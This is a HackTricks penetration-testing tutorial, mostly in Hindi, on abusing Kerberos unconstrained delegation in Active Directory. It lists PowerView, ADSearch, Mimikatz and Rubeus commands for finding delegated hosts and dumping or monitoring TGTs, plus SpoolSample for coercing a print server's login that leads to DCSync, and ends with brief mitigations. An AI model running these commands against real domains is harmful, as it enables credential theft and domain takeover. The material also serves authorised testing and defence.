# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

यह एक विशेषता है जिसे एक डोमेन प्रशासक डोमेन के अंदर किसी भी **कंप्यूटर** पर सेट कर सकता है। फिर, जब भी कोई **उपयोगकर्ता उस कंप्यूटर पर लॉगिन करता है**, उस उपयोगकर्ता का **TGT की एक प्रति** **DC द्वारा प्रदान किए गए TGS के अंदर भेजी जाएगी** **और LSASS में मेमोरी में सहेजी जाएगी**। इसलिए, यदि आपके पास मशीन पर प्रशासक विशेषाधिकार हैं, तो आप **टिकटों को डंप कर सकते हैं और किसी भी मशीन पर उपयोगकर्ताओं का अनुकरण कर सकते हैं**।

तो यदि एक डोमेन प्रशासक "अनकॉनस्ट्रेन्ड डेलीगेशन" विशेषता सक्रिय करके किसी कंप्यूटर पर लॉगिन करता है, और आपके पास उस मशीन के अंदर स्थानीय प्रशासक विशेषाधिकार हैं, तो आप टिकट को डंप कर सकते हैं और कहीं भी डोमेन प्रशासक का अनुकरण कर सकते हैं (डोमेन प्रिवेस्क)।

आप इस विशेषता के साथ कंप्यूटर ऑब्जेक्ट्स **खोज सकते हैं** यह जांचकर कि [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) विशेषता में [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) शामिल है या नहीं। आप इसे ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ के LDAP फ़िल्टर के साथ कर सकते हैं, जो पॉवव्यू करता है:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

**Mimikatz** या **Rubeus** के साथ प्रशासक (या पीड़ित उपयोगकर्ता) का टिकट मेमोरी में लोड करें **[**पास द टिकट**](pass-the-ticket.md)** के लिए।\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**अनकॉनस्ट्रेन्ड डेलीगेशन के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

यदि एक हमलावर **"अनकॉनस्ट्रेन्ड डेलीगेशन" के लिए अनुमत कंप्यूटर को समझौता करने में सक्षम है**, तो वह **प्रिंट सर्वर** को **स्वचालित रूप से लॉगिन** करने के लिए **धोखा दे सकता है** जिससे **सर्वर की मेमोरी में एक TGT सहेजा जाएगा**।\
फिर, हमलावर **उपयोगकर्ता प्रिंट सर्वर कंप्यूटर खाते का अनुकरण करने के लिए एक पास द टिकट हमले का प्रदर्शन कर सकता है**।

किसी भी मशीन के खिलाफ प्रिंट सर्वर को लॉगिन कराने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT एक डोमेन कंट्रोलर से है, तो आप एक [**DCSync attack**](acl-persistence-abuse/#dcsync) कर सकते हैं और DC से सभी हैश प्राप्त कर सकते हैं।\
[**इस हमले के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**यहाँ प्रमाणीकरण को मजबूर करने के अन्य तरीके हैं:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### शमन

* DA/एडमिन लॉगिन को विशिष्ट सेवाओं तक सीमित करें
* विशेषाधिकार प्राप्त खातों के लिए "खाता संवेदनशील है और इसे प्रतिनिधित्व नहीं किया जा सकता" सेट करें।

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
